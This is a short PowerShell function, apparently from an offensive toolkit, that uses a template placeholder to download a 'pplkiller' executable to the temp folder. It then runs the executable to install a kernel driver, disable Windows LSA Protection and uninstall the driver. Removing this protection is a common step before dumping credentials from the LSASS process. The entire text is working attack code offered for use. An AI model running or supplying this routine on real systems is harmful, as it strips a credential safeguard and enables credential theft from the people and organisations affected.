Function Invoke-KillPPL
{
    $s = "$env:tmp\pplk.exe";
    %pplkiller_dl% -o $s;
    & $s /installDriver; 
    & $s /disableLSAProtection; 
    & $s /uninstallDriver; 
    Write-Host "[+] Done";
}
